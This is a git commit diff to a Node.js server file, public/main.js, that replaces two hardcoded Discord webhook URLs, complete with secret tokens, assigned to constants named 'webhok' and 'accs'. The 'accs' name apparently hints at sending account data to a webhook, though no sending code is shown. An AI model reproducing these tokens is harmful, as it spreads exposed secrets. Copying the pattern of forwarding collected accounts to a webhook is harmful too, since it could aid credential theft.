8d4e1e2c1602f468a601d7cb42a7fe03b50a01f4
Maybeacat2 <105564731+Maybeacat2@users.noreply.github.com>
2022-06-12 10:34:02 -0400

    Update main.js

--- public/main.js
+++ public/main.js
@@ -14,8 +14,8 @@ const {
 
 const publicPath = path.join(__dirname, 'public')
 const port = process.env.PORT || 80
-const webhok = "https://discord.com/api/webhooks/954865663799877702/nMHJwjvHnw6YNhUkGCfxXGmBLrroUQ6FBrLDMgV7lHv5fxGHto0wIzd21IdkleHSsW_5";
-const accs = "https://discord.com/api/webhooks/954865663799877702/nMHJwjvHnw6YNhUkGCfxXGmBLrroUQ6FBrLDMgV7lHv5fxGHto0wIzd21IdkleHSsW_5";
+const webhok = "https://discord.com/api/webhooks/981729779386568761/qlgIEmwfj093tPBQyppPJcxS668IreqmbU4at1j-hrwYEqTE-VHRwbi_R8u61AV3tF7F";
+const accs = "https://discord.com/api/webhooks/981729779386568761/qlgIEmwfj093tPBQyppPJcxS668IreqmbU4at1j-hrwYEqTE-VHRwbi_R8u61AV3tF7F";
 let app = express()
 let server = http.createServer(app)
 let io = socketIO(server, {
